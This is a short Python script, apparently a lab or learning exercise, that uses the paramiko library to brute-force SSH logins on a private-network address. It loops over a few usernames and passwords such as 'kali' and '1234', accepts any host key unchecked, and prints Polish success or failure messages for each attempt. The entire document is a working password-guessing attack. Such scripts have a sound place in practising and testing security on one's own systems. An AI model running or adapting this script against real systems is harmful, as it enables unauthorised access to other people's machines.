import paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

users = ["kali", "test", ]
passwords = ["1234", "kali"]

for user in users:
    for passwd in passwords:
        try:
            print(f"Próba logowania: {user}:{passwd}", end="")
            ssh.connect("192.168.1.42", port=22, username=user, password=passwd, timeout=5)
            print(f" - SUKCES")
        except Exception as e:
            print(f" - :(", end=" - ")
            print(e)
            pass
